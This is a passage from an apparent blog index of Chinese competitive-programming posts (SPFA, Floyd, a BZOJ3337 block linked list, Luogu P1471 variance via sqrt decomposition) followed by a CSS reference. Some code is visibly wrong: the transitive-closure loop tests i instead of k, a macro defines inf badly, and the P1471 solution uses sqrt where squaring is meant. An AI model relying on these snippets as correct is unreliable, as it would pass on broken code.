0;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//毒瘤的指针qwq#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;queue&gt;using namespace std;#define inf 2e31-1;#define DEBUG(x) std::cerr &lt;&lt; #x &lt;&lt; "=" &lt;&lt; x &lt;&lt; std::endl#define MAXN 2500 + 5struct Node;struct Edge;//邻接表存储图struct Node&#123; Edge *firstEdge; int dist; bool inQueue;&#125; node[MAXN];struct Edge&#123; Node *s, *t; int w; Edge *next; Edge(Node *s, Node *t, int w) : s(s), t(t), w(w), next(s-&gt;firstEdge) &#123;&#125;&#125;;inline void add(const int &amp;s,const int &amp;t,const int &amp;w)&#123; node[s].firstEdge = new Edge(&amp;node[s], &amp;node[t],w); node[t].firstEdge = new Edge(&amp;node[t], &amp;node[s], w);&#125;inline int spfa(const int &amp;s,const int &amp;t,const int &amp;n)&#123; //核心代码 for (int i = 1; i &lt;= n; i++)&#123; node[i].dist = inf; node[i].inQueue = false; &#125; queue&lt;Node *&gt; q; q.push(&amp;node[s]); node[s].dist = 0; node[s].inQueue = true; while(!q.empty())&#123; Node *u = q.front(); q.pop(); u-&gt;inQueue = false; for(Edge *e = u-&gt;firstEdge; e; e = e-&gt;next)&#123; Node *v = e-&gt;t; if(v-&gt;dist &gt; u-&gt;dist + e-&gt;w)&#123; v-&gt;dist = u-&gt;dist + e-&gt;w; if(!v-&gt;inQueue)&#123; q.push(v); v-&gt;inQueue = true; &#125; &#125; &#125; &#125; return node[t].dist;&#125;int main()&#123; int n,m,s,t; scanf("%d%d%d%d",&amp;n,&amp;m,&amp;s,&amp;t); for(int i = 1;i &lt;= m;i++)&#123; int u,v,w; scanf("%d%d%d",&amp;u,&amp;v,&amp;w); add(u,v,w); &#125; printf("%d",spfa(s,t,n)); return 0;&#125;FloydFloyd 可以求任意两点间最短路径.采用了动规的思想，kkk 是动规中的阶段，必须置于循环体外层!!Floyd 算法时间复杂度: O(n3)O(n^3)O(n​3​​)Code:1234for(int k = 1; k &lt;= n; k++) for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) if(f[i][j] &gt; f[i][k] + f[k][j]) f[i][j] = f[i][k] + f[k][j];Floyd那么慢，有什么用呢？经典问题：传递闭包在交际网络中，给定 nnn 个元素和若干对二元关系，且关系具有传递性，同过传递性求出更多元素之间的关系Code:1234for (int k = 1; i &lt;= n; k ++) for (int i = 1; i &lt;= n; i ++) for (int j = 1; j &lt;= n; j ++) d[i][j] |= d[i][k] &amp; d[k][j];]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>dijkstra</tag>
        <tag>模版</tag>
        <tag>图论</tag>
        <tag>spfa</tag>
        <tag>Ford</tag>
        <tag>最短路</tag>
        <tag>单源最短路径</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「BZOJ3337」ORZJRY I - 块状链表]]></title>
    <url>%2Farticles%2Fbzoj-3337%2F</url>
    <content type="text"><![CDATA[这是一道毒瘤数据结构题目..实现一种数据结构自从做了这题，感觉世界豁然开朗了qaq感觉自己再也不怂数据结构题了感觉自己的块状链表打开了新世界感觉维修数列已经不再是恐怖的数据结构题了quq数据结构？还是too youngInput第一行nnn； 第二行nnn个数； 第三行qqq，代表询问个数； 接下来qqq行，每行一个opopop，输入格式见描述。Output对于7≤op≤117\le op\le 117≤op≤11的操作，一行输出一个答案。Sample Input12345678910111213141516171865 2 6 3 1 4157 2 48 1 39 2 4 510 1 6 411 2 5 46 1 4 78 1 45 3 4 52 11 2 83 3 54 1 5 29 2 5 410 3 6 411 1 6 100Sample Output12345678911414303126HINTn,q≤100000n,q\le 100000n,q≤100000； 任意时刻数列中的数≤231−1\le 2^{31}-1≤2​31​​−1。 0≤0\le0≤任意时刻数列中的数≤231−1\le 2^{31}-1≤2​31​​−1。本题共333组数据Code压行450行....123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;climits&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;#include &lt;vector&gt;#include &lt;stack&gt;#include &lt;queue&gt;typedef long long ll;const int MAXN = 10010;const int MAXM = 1010;const int INF = 1 &lt;&lt; 29;int m, n;int size;inline int SlowRead() &#123; int x = 0, f = 1; char ch = getchar(); while (ch &lt; '0' || ch &gt; '9') &#123; if(ch == '-') f = -1; ch = getchar(); &#125; while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; x = x * 10 + ch - '0'; ch = getchar(); &#125; return x * f;&#125;class queue &#123; // [l,r)private: int l, r; int Mem_Pool[MAXN]; const int QUEUE_MID = 5005;public: inline void clear () &#123; memset (Mem_Pool, 0, sizeof (Mem_Pool)); l = 0; r = 1; &#125; inline int push (int p) &#123; return Mem_Pool[++r] = p; &#125; inline int pop () &#123; return Mem_Pool[++l]; &#125; inline int front () &#123; return Mem_Pool[l]; &#125;&#125;;class Node &#123;public: int d[MAXM], s[MAXM]; int rev, add, same; int next, size; ll sum; Node () &#123; memset (d, 0, sizeof (d)); memset (s, 0, sizeof (s)); rev = add = same = next = size = 0; sum = 0; &#125;&#125; a[MAXN];const inline int max (const int &amp;a, const int &amp;b) &#123; return a &gt; b ? a : b;&#125;const inline int min (const int &amp;a, const int &amp;b) &#123; return a &lt; b ? a : b;&#125;const inline void swap (int &amp;a, int &amp;b) &#123; int temp; temp = a; a = b; b = temp;&#125;queue q;inline void init () &#123; q.clear(); a[0].next = -1; a[0].size = 0;&#125;inline int New_Node () &#123; int temp = q.front(); q.pop(); return temp;&#125;inline void clear (int x) &#123; a[x].rev = 0; a[x].add = 0; a[x].same = 0; a[x].size = 0;&#125;void Delete (int x) &#123; q.push (x); clear(x);&#125;void pushDown (int now) &#123; int tot = a[now].size; if (a[now].rev) &#123; a[now].rev = false; int t = tot &gt;&gt; 1; for (int u = 1; u &lt;= t; u++) &#123; swap(a[now].d[u], a[now].d[tot - u + 1]); &#125; &#125; if (a[now].same != 0) &#123; for (int u = 1; u &lt;= tot; u++) a[now].d[u] = a[now].same; a[now].sum = a[now].same * tot; a[now].same = 0; &#125; if (a[now].add != 0) &#123; for (int u = 1; u &lt;= tot; u++) a[now].d[u] += a[now].add; a[now].sum = a[now].sum + a[now].add*tot; a[now].add = 0; &#125; return;&#125;void find (int &amp;pos, int &amp;now) &#123; for (now = 0; a[now].next != -1 &amp;&amp; pos &gt; a[now].size; now = a[now].next) pos -= a[now].size;&#125;void update (int x) &#123; a[x].sum = 0; for (int u = 1; u &lt;= a[x].size; u++) &#123; a[x].sum += a[x].d[u]; a[x].s[u] = a[x].d[u]; &#125; std::sort(a[x].s + 1, a[x].s + a[x].size + 1);&#125;void spilt (int now,int pos) &#123; pushDown(now); int t = New_Node(); for (int u = pos; u &lt;= a[now].size; u++) a[t].d[ ++a[t].size ] = a[now].d[u]; a[t].next = a[now].next; a[now].next = t; a[now].size = max(pos-1, 0); update(t); update(now);&#125;void Merge (int now) &#123; int k = a[now].next; pushDown(now); pushDown(k); for (int u = 1; u &lt;= a[k].size; u++) a[now].d[ ++a[now].size ] = a[k].d[u]; a[now].next = a[k].next; Delete(k); update(now);&#125;void maintain (int now) &#123; for (; now != -1; now = a[now].next) if (a[now].next != -1 &amp;&amp; a[now].size + a[ a[now].next ].size &lt;= size) Merge(now);&#125;void ins (int pos, int x) &#123; int now; pos++; find (pos,now); spilt(now,pos); a[now].d[ ++a[now].size ] = x; a[now].sum += x; int lalal; for (lalal = 1; lalal &lt; a[now].size; lalal++) if (a[now].s[lalal] &gt; x) break; for (int u = a[now].size; u &gt; lalal; u--) a[now].s[u] = a[now].s[u - 1]; a[now].s[lalal] = x; maintain (now);&#125;void Del (int pos) &#123; int now; find (pos, now); pushDown (now); for (int u = pos + 1; u &lt;= a[now].size; u++) a[now].d[u - 1] = a[now].d[u]; a[now].size--; update(now); maintain(now);&#125;void solve (int left, int right, int &amp;lp, int &amp;rp) &#123; int pos = left; find(pos,lp); spilt(lp,pos); pos = right + 1; find(pos, rp); spilt(rp, pos); pos = right; find(pos,rp);&#125;int st[MAXN];void reverse (int left, int right)&#123; int lp, rp; solve(left, right, lp, rp); int top = 0; for (int u = a[lp].next; u != a[rp].next; u = a[u].next) st[++top] = u,a[u].rev^=1; a[st[1]].next = a[rp].next; for (int u = top;u &gt; 1;u--) a[st[u]].next = st[u-1]; a[lp].next = rp; maintain(lp);&#125;void add (int left, int right, int value) &#123; int lp, rp; solve (left, right, lp, rp); for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; a[now].add += value; a[now].sum = a[now].sum + a[now].size * value; &#125; maintain (lp);&#125;void same (int l,int r,int value) &#123; int lp, rp; solve(l, r, lp, rp); for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; a[now].add = 0; a[now].same = value; a[now].sum = a[now].size * value; &#125; maintain(lp);&#125;ll get (int left, int right) &#123; int lp, rp; solve(left, right, lp, rp); ll ans = 0; for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; ans = ans + a[now].sum; &#125; maintain (lp); return ans;&#125;int Get_Max_Min (int left, int right) &#123; int lp, rp; solve(left, right, lp, rp); int qmax = -INF, qmin = INF; for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; if (a[now].size != 0) &#123; if (a[now].same!=0) &#123; qmin = min (qmin, a[now].same + a[now].add); qmax = max (qmax, a[now].same + a[now].add); &#125; else &#123; qmin = min (qmin, a[now].s[1] + a[now].add); qmax = max (qmax, a[now].s[ a[now].size ] + a[now].add); &#125; &#125; &#125; maintain (lp); return qmax - qmin;&#125;int near (int l, int r, int val) &#123; int lp, rp; solve (l, r, lp, rp); int ans = INF; for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; if (a[now].same) ans = min (ans, abs(val - a[now].same - a[now].add)); else &#123; int id = std::lower_bound(a[now].s + 1,a[now].s + a[now].size + 1,val - a[now].add) - a[now].s; if (id != a[now].size + 1) ans = min (ans, a[now].s[id] + a[now].add - val); if (id != 1) id--, ans = min(ans, val - a[now].s[id] - a[now].add); &#125; &#125; maintain(lp); return ans;&#125;int ask_mink (int l, int r, int k) &#123; int lp, rp; solve (l, r, lp, rp); int lll = 0,rr = INF; while (lll &lt; rr) &#123; int mid = (lll + rr) / 2 + 1; int sum = 1; for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; if (a[now].same != 0) &#123; if (a[now].same + a[now].add &lt; mid) sum = sum + a[now].size; &#125; else &#123; int id = std::upper_bound (a[now].s + 1, a[now].s + a[now].size + 1,mid - a[now].add - 1) - a[now].s; sum = sum + max (0, id - 1); &#125; &#125; if (k &gt;= sum) lll = mid; else rr = mid - 1; &#125; maintain (lp); return lll;&#125;int ask_smaller(int l,int r,int val) &#123; int lp, rp; solve(l, r, lp, rp); int ans = 0; for (int now = a[lp].next; now != a[rp].next; now = a[now].next) &#123; if (a[now].same != 0) &#123; if (a[now].same + a[now].add &lt; val) ans = ans + a[now].size; &#125; else &#123; int it = std::upper_bound (a[now].s + 1, a[now].s + a[now].size + 1,val - a[now].add - 1) - a[now].s; ans = ans + it - 1; &#125; &#125; maintain (lp); return ans;&#125;void move (int l, int r, int k) &#123; int lp, mp, rp, np; solve (l, r - k, lp, mp); solve (r - k + 1, r, mp, rp); np = a[lp].next; a[lp].next = a[mp].next; a[mp].next = a[rp].next; a[rp].next = np; maintain (lp);&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead(); size = sqrt(n); init(); for (int u = 1; u &lt;= n; u++) &#123; int x = SlowRead(); ins(u - 1, x); &#125; m = SlowRead(); for (int u = 1; u &lt;= m; u++) &#123; int op, x, y, z; op = SlowRead(); switch(op) &#123; case 1: &#123; x = SlowRead(); y = SlowRead(); ins (x,y); break; &#125; case 2: &#123; x=SlowRead(); Del (x); break; &#125; case 3: &#123; x = SlowRead(); y=SlowRead(); reverse (x, y); break; &#125; case 4: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); move (x, y, z); break; &#125; case 5: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); add(x,y,z); break; &#125; case 6: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); same(x,y,z); break; &#125; case 7: &#123; x = SlowRead(); y = SlowRead(); printf ("%lld\n", get(x, y)); break; &#125; case 8: &#123; x = SlowRead(); y = SlowRead(); printf ("%d\n", Get_Max_Min(x, y)); break; &#125; case 9: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); printf ("%d\n", near(x, y, z)); break; &#125; case 10: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); printf ("%d\n", ask_mink(x, y, z)); break; &#125; case 11: &#123; x = SlowRead(); y = SlowRead(); z = SlowRead(); printf ("%d\n", ask_smaller(x, y, z)); break; &#125; &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>毒瘤</tag>
        <tag>区间</tag>
        <tag>分块</tag>
        <tag>块状链表</tag>
        <tag>bzoj</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「Luogu P1471 方差」 - 分块 + 区间查询方差 + 区间查询平均数]]></title>
    <url>%2Farticles%2F%E5%88%86%E5%9D%97-P1471%2F</url>
    <content type="text"><![CDATA[题目大意维护一个数列，支持区间修改，区间查询平均数，区间查询方差这种区间修改区间查询类的一眼看上去就是线段树嘛…我们先把方差公式拆开：(为了区分，就把x¯\bar x​x​¯​​当做aaa序列的平均数吧才不是写错了懒得改呢quq)(最后忍不住了，就用∑\sum∑了...保证前边大部分都是初中可以看懂的..s2=(a1−x¯)2+(a2−x¯)2+⋯+(an−x¯)2ns^2 = {(a_1 - \bar x)^2+(a_2 - \bar x)^2+\cdots+(a_n-\bar x)^2 \over n}s​2​​=​n​​(a​1​​−​x​¯​​)​2​​+(a​2​​−​x​¯​​)​2​​+⋯+(a​n​​−​x​¯​​)​2​​​​=(a12−2a1x¯+x¯2)+(a22−2a2x¯+x¯2)+⋯+(an−12−2an−1x¯+x¯2)+(an2−2anx¯+x¯2)n={(a_1^2-2a_1\bar x + \bar x^2)+(a_2^2-2a_2\bar x + \bar x^2)+\cdots+(a_{n-1}^2-2a_{n-1}\bar x + \bar x^2)+(a_n^2-2a_n\bar x + \bar x^2) \over n}=​n​​(a​1​2​​−2a​1​​​x​¯​​+​x​¯​​​2​​)+(a​2​2​​−2a​2​​​x​¯​​+​x​¯​​​2​​)+⋯+(a​n−1​2​​−2a​n−1​​​x​¯​​+​x​¯​​​2​​)+(a​n​2​​−2a​n​​​x​¯​​+​x​¯​​​2​​)​​=(a12+a22+⋯+an−12+an2)−2(a1x¯+a2x¯+⋯+an−1x¯+anx¯)+nx¯2n={(a_1^2+a_2^2+\cdots+a_{n-1}^2+a_n^2) - 2(a_1\bar x+a_2\bar x+\cdots +a_{n-1}\bar x +a_n\bar x) + n\bar x^2 \over n}=​n​​(a​1​2​​+a​2​2​​+⋯+a​n−1​2​​+a​n​2​​)−2(a​1​​​x​¯​​+a​2​​​x​¯​​+⋯+a​n−1​​​x​¯​​+a​n​​​x​¯​​)+n​x​¯​​​2​​​​∵a1+a2+⋯+an−1+an=nx¯\because a_1 + a_2 + \cdots+a_{n-1}+a_n = n\bar x∵a​1​​+a​2​​+⋯+a​n−1​​+a​n​​=n​x​¯​​thenn×s2=(a12+a22+⋯+an−12+an2)−2×x¯(a1+a2+⋯+an−1+an)+nx¯2\text{then}\;\; n\times s^2 =(a_1^2+a_2^2+\cdots+a_{n-1}^2+a_n^2) - 2\times \bar x(a_1+a_2+\cdots +a_{n-1}+a_n) + n\bar x^2thenn×s​2​​=(a​1​2​​+a​2​2​​+⋯+a​n−1​2​​+a​n​2​​)−2×​x​¯​​(a​1​​+a​2​​+⋯+a​n−1​​+a​n​​)+n​x​¯​​​2​​n×s2=(a12+a22+⋯+an−12+an2)−2nx¯2+nx¯2n \times s^2= (a_1^2+a_2^2+\cdots+a_{n-1}^2+a_n^2) -2n\bar x^2 +n\bar x^2n×s​2​​=(a​1​2​​+a​2​2​​+⋯+a​n−1​2​​+a​n​2​​)−2n​x​¯​​​2​​+n​x​¯​​​2​​s2=(a12+a22+⋯+an−12+an2)−nx¯2ns^2 ={ (a_1^2+a_2^2+\cdots+a_{n-1}^2+a_n^2) - n\bar x^2 \over n}s​2​​=​n​​(a​1​2​​+a​2​2​​+⋯+a​n−1​2​​+a​n​2​​)−n​x​¯​​​2​​​​s2=−x¯2+(∑i=1nai2n)s^2 = -\bar x^2 + \left({\sum_{i = 1}^na_i^2\over n}\right)s​2​​=−​x​¯​​​2​​+(​n​​∑​i=1​n​​a​i​2​​​​)s2=−(∑i=1nain)2+(∑i=1nai2n)s^2 = -\left({\sum_{i = 1}^na_i\over n}\right)^2+\left({\sum_{i = 1}^na_i^2\over n}\right)s​2​​=−(​n​​∑​i=1​n​​a​i​​​​)​2​​+(​n​​∑​i=1​n​​a​i​2​​​​)可以看出其实这题我们维护区间和和区间平方和即可……（更可以坚定地看出线段树就能维护……）线段树？可以。而且应该是标算。但我就是想用分块乱搞你咬我啊= =时间复杂度：O(mn12)O(mn^{1\over2})O(mn​​2​​1​​​​)，略慢于线段树的O(mlogn)O(mlogn)O(mlogn)，但常数小一些，有时还能踩掉线段树区间修改？（又要划狮子，累死了= =）完整的块直接打标记即可（我沿用了线段树的lazylazylazy标记的名字）不完整的块，要暴力，同时修改点值和所在块的sumsumsum值（区间和）和sqssqssqs值（区间平方和）。。暴力修改的时候（设修改的值为sss）sqsl→r=al2+al+12+⋯+ar−12+ar2sqs_{l\rightarrow r} = a_l^2 + a_{l+1}^2+\cdots + a_{r-1}^2 + a_r^2sqs​l→r​​=a​l​2​​+a​l+1​2​​+⋯+a​r−1​2​​+a​r​2​​ifap→ap+q\text {if} \;\;\;a_p\rightarrow a_p + qifa​p​​→a​p​​+qthensqsl→r′=al2+al+12+⋯+(ap+q)2+⋯+ar−12+ar2\text {then} \; sqs_{l\rightarrow r}&#x27;=a_l^2 + a_{l+1}^2+\cdots +(a_p+q)^2+\cdots+ a_{r-1}^2 + a_r^2thensqs​l→r​′​​=a​l​2​​+a​l+1​2​​+⋯+(a​p​​+q)​2​​+⋯+a​r−1​2​​+a​r​2​​sqsl→r′=sqsl→r+2apq+q2sqs&#x27;_{l \rightarrow r}=sqs_{l\rightarrow r} + 2a_pq + q^2sqs​l→r​′​​=sqs​l→r​​+2a​p​​q+q​2​​so Δsqs=sqsl→r′−sqsl→r=2apq+q2\text {so}\ \ \Delta sqs = sqs&#x27;_{l \to r}-sqs_{l \to r}=2a_pq+q^2so Δsqs=sqs​l→r​′​​−sqs​l→r​​=2a​p​​q+q​2​​平均数的查询？查询区间和，最后除以区间长度 r−l+1r-l+1r−l+1 即可方差的查询？由上公式，查询区间和和区间平方和，最后套公式算即可（区间长度nnn已知为r−l+1r-l+1r−l+1）区间平方和？哦，完整的块中我们又要化一下式子QAQ……..等等，我们好像使用了lazylazylazy标记!sysl→r′=∑i=lr(ai+lazy)2=∑i=lr(ai2+2×lazy×ai+lazy2)sys_{l\to r}&#x27; = \sum_{i = l}^r(a_i+ lazy)^2 = \sum_{i=l}^r(a_i^2+2\times lazy \times a_i + lazy^2)sys​l→r​′​​=​i=l​∑​r​​(a​i​​+lazy)​2​​=​i=l​∑​r​​(a​i​2​​+2×lazy×a​i​​+lazy​2​​)sysl→r′=∑i=lrai2+2∑i=lr(lazy×ai)+(r−l+1)×lazy2sys&#x27;_{l\to r} = \sum_{i=l}^ra_i^2 + 2\sum_{i=l}^r(lazy \times a_i) + (r-l+1)\times lazy^2sys​l→r​′​​=​i=l​∑​r​​a​i​2​​+2​i=l​∑​r​​(lazy×a​i​​)+(r−l+1)×lazy​2​​becausesysl→r=∑l=lrai2\text {because}\;\; sys_{l\to r}=\sum_{l=l}^ra_i^2becausesys​l→r​​=​l=l​∑​r​​a​i​2​​Δsqs=2∑i=lr(lazy×ai)+(r−l+1)×lazy2\Delta sqs = 2\sum_{i=l}^r(lazy \times a_i) + (r-l+1)\times lazy^2Δsqs=2​i=l​∑​r​​(lazy×a​i​​)+(r−l+1)×lazy​2​​because∑i=lrai=sumi\text{because} \;\; \sum_{i=l}^ra_i=sum_ibecause​i=l​∑​r​​a​i​​=sum​i​​soΔsqs=2lazy×sumi+(r−l+1)×lazy\text{so}\;\; \Delta sqs=2 lazy\times sum_i+(r-l+1)\times lazysoΔsqs=2lazy×sum​i​​+(r−l+1)×lazy差不多就是这样。。化这几个式子累死我了 (:з」∠)然后剩下的就是乱搞了。。（写线段树的也可以像上面讲的一样维护区间。。式子可能稍微不同但精神是相似的！！）究极压行又不失可读性的代码：1234567891011121314151617181920212223242526272829#include &lt;bits/stdc++.h&gt; double a[101010],lz[101010],sum[101010],sqs[101010]; int bl[101010],n,blk,m,ans,ave;inline int gnum()&#123; int a=0;char c=getchar();bool f=0;for(;(c&lt;'0'||c&gt;'9')&amp;&amp;c!='-';c=getchar());if(c=='-') f=1,c=getchar(); for(;c&gt;='0'&amp;&amp;c&lt;='9';c=getchar()) a=(a&lt;&lt;1)+(a&lt;&lt;3)+c-'0'; if(f) return -a; return a;&#125;void add(int L,int R,double s)&#123; for(int i=L;i&lt;=std::min(bl[L]*blk,R);i++) sqs[bl[L]]+=2*a[i]*s+sqrt(s),a[i]+=s,sum[bl[L]]+=s; if(bl[L]!=bl[R]) for(int i=(bl[R]-1)*blk+1;i&lt;=R;i++) sqs[bl[R]]+=2*a[i]*s+sqrt(s),a[i]+=s,sum[bl[R]]+=s; for(int i=bl[L]+1;i&lt;=bl[R]-1;i++)lz[i]+=s; &#125;double query1(int L,int R)&#123; ans=0;for(int i=L;i&lt;=std::min(bl[L]*blk,R);i++) ans+=a[i]+lz[bl[L]]; if(bl[L]!=bl[R]) for(int i=(bl[R]-1)*blk+1;i&lt;=R;i++) ans+=a[i]+lz[bl[R]]; for(int i=bl[L]+1;i&lt;=bl[R]-1;i++) ans+=sum[i]+lz[i]*blk; return ans/(R-L+1);&#125;double query2(int L,int R)&#123; ave=0,ans=0; for(int i=L;i&lt;=std::min(bl[L]*blk,R);i++) ave+=a[i]+lz[bl[L]],ans+=sqrt(a[i]+lz[bl[L]]); if(bl[L]!=bl[R]) for(int i=(bl[R]-1)*blk+1;i&lt;=R;i++) ave+=a[i]+lz[bl[R]],ans+=sqrt(a[i]+lz[bl[R]]); for(int i=bl[L]+1;i&lt;=bl[R]-1;i++) ave+=sum[i]+lz[i]*blk,ans+=sqs[i]+2*sum[i]*lz[i]+blk*sqrt(lz[i]); return -sqrt(ave/(R-L+1))+ans/(R-L+1);&#125;int main()&#123; n=gnum(); m=gnum(); blk=sqrt(n); for(int i=1;i&lt;=n;i++)&#123;scanf("%lf",&amp;a[i]); bl[i]=(i-1)/blk+1; sum[bl[i]]+=a[i]; sqs[bl[i]]+=sqrt(a[i]);&#125; while(m--&gt;0)&#123; int opt; scanf("%d",&amp;opt); if(opt==1)&#123;int l=gnum(),r=gnum(); double s; scanf("%lf",&amp;s);add(l,r,s);&#125; if(opt==2)&#123;int l=gnum(),r=gnum(); printf("%.4lf\n",query1(l,r));&#125; if(opt==3)&#123;int l=gnum(),r=gnum(); printf("%.4lf\n",query2(l,r));&#125; &#125;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>分块</tag>
        <tag>暴力</tag>
        <tag>Luogu</tag>
        <tag>方差</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「css/html」一些常用的css语法]]></title>
    <url>%2Farticles%2Fcss-QWQ%2F</url>
    <content type="text"><![CDATA[本文介绍一下一些css的标签把鼠标移到这里-&gt;对，就是这里左边是可以打开的，但是右面这个你就算使用小刀也刮不开(你可以试试) Blog 黑幕的设置相信大家都对萌娘百科的&quot;黑幕&quot;代码了解吧quq今天我就复制一遍这就是黑幕12&lt;!-- 这里是上面内容实现的代码 --&gt;&lt;span class="heimu" title="你知道的太多了"&gt;这就是黑幕&lt;/span&gt;下面是我的Blog中custom.styl的配置:123456789101112/* * 这里是Shq大蒟蒻自己写的仿照萌娘百科的"黑幕"qwq */.heimu&#123; background-color: Black; color: Black;&#125;.heimu:hover&#123; cursor: help; color: White;&#125;CSS常用属性下面介绍一些css常用的属性，读者也可以参考一些前端框架 比如：BootstrapCSS文字属性标签意义color : #999999;/文字颜色/font-family : 宋体,sans-serif;/文字字体/font-size : 9pt;/文字大小/font-style:itelic;/文字斜体/font-variant:small-caps;/小字体/letter-spacing : 1pt;/字间距离/line-height : 200%;/设置行高/font-weight:bold;/文字粗体/vertical-align:sub;/下标字/vertical-align:super;/上标字/text-decoration:line-through;/加删除线/text-decoration: overline;/加顶线/text-decoration:underline;/加下划线/text-decoration:none;/无修饰线/text-transform : capitalize;/首字大写/text-transform : uppercase;/英文大写/text-transform : lowercase;/英文小写/text-align:right;/文字右对齐/text-align:left;/文字左对齐/text-align:center;/内部元素居中/text-align:justify;/文字分散对齐/vertical-align:top;/垂直对齐该行元素内的最大元素顶部/vertical-align:bottom;/垂直对齐该行元素内的最大元素的底部/vertical-align:middle;/垂直居中对齐/vertical-align:text-top;/垂直对齐父元素的顶部/vertical-align:text-bottom;/垂直对齐父元素的底部/top、bottom、text-top、text-bottom区别overflow:hidden;//隐藏文本溢出部分white-space:nowrap;//对文本不换行text-overflow:ellipsis;//溢出部分用省略表示(基于前两个属性都有的情况下)text-overflow:clip;//剪切text-overflow:&quot;.....&quot;;//自定义格式position:absolute;//设置文档的位置为绝对定位，relative表示相对定位right:50px;//表示该元素距离右边元素的距离为50px，使用该元素必需设置position元素属性意义z-index；/指定元素的堆叠顺序/clip：rect(top,right,bottom,left);/剪切图形/flex/flex布局,在使用flex布局的时候，需要将父容器的flex的display设置为display:flex;/title:提示信息title元素用在指定的元素上，会出现提示信息。CSS边框空白属性意义padding-top:10px;/上边框留空白/padding-right:10px;/右边框留空白/padding-bottom:10px;/下边框留空白/padding-left:10px;/左边框留空白/CSS符号属性属性意义list-style-type:none;/不标记/list-style-type:decimal;/阿拉伯数字标记/list-style-type:lower-roman;/小写罗马数字标记，如：i,ii,iii,iv,v等/list-style-type:upper-roman;/大写罗马数字标记，如：I,II,III,IV,V等/list-style-type:lower-alpha;/小写英文字母标记/list-style-type:upper-alpha;/大写英文字母标记/list-style-type:disc;/实心圆标记/list-style-type:circle;/空心圆标记/list-style-type:square;/实心方块标记/list-style-image:url(/dot.gif);/自定义图片标记/list-style-position: outside;/凸排/list-style-position:inside;/缩进/CSS背景样式属性意义background:transparent;/透视背景/background-image : url(/image/bg.gif);/背景图片/background-attachment : fixed;/浮水印固定背景/background-repeat : repeat;/重复排列-网页默认/background-repeat : no-repeat;/不重复排列/background-repeat : repeat-x;/在x轴重复排列/background-repeat : repeat-y;/在y轴重复排列/指定背景位置属性意义background-position : x% y%;/背景图片x与y轴的位置/background-position : top;/向上对齐/background-position : buttom;/向下对齐/background-position : left;/向左对齐/background-position : right;/向右对齐/background-position : center;/居中对齐/CSS连接属性属性意义a/所有超链接/a:link/超链接文字格式/a:visited/浏览过的链接文字格式/a:active/按下链接的格式/a:hover/鼠标转到链接/鼠标光标样式鼠标代码禁止cursor:not-allowed;链接手指cursor:pointer十字体cursor:crosshair帮助光标(会有个问号)cursor:help十字箭头cursor:move文字T型cursor:text后台程序运行型cursor:progress漏斗cursor:wait箭头朝右或右cursor:w-resize或cursor:e-resize箭头朝上或下cursor:n-resize或cursor:s-resize箭头朝右上或右下cursor:ne-resize或cursor:se-resize箭头朝左上或左下cursor:nw-resize或cursor:sw-resize自定义光标p {cursor:url(“光标文件名.ico”),text;}CSS框线一览表属性意义border-top : 1px solid #6699cc;/上框线/border-bottom : 1px solid #6699cc;/下框线/border-left : 1px solid #6699cc;/左框线/border-right : 1px solid #6699cc;/右框线/以上是建议书写方式,但也可以使用常规的方式 如下:属性意义border-top-color : #369/设置上框线top颜色/border-top-width :1px/设置上框线top宽度/border-top-style : solid/设置上框线top样式/其他框线样式属性意义solid/实线框/dotted/虚线框/double/双线框/groove/立体内凸框/ridge/立体浮雕框/inset/凹框/outset/凸框/CSS边界样式属性意义margin-top:10px;/上边界/margin-right:10px;/右边界值/margin-bottom:10px;/下边界值/margin-left:10px;/左边界值/margin:0 auto;/让自己居中在父元素中间/常用CSS组合12345678myCSS1 &#123; display: block; margin: 0px; padding: 0px; white-space: pre-wrap; padding:50px; font-size:30px;&#125;calc的使用1top: calc(50% - 120px);calc() 函数用于动态计算长度值。需要注意的是:运算符前后都需要保留一个空格，例如：width: calc(100% - 10px)；任何长度值都可以使用calc()函数进行计算；calc()函数支持&quot;+&quot;, &quot;-&quot;, &quot;*&quot;, &quot;/&quot; 运算；calc()函数使用标准的数学运算优先级规则；]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
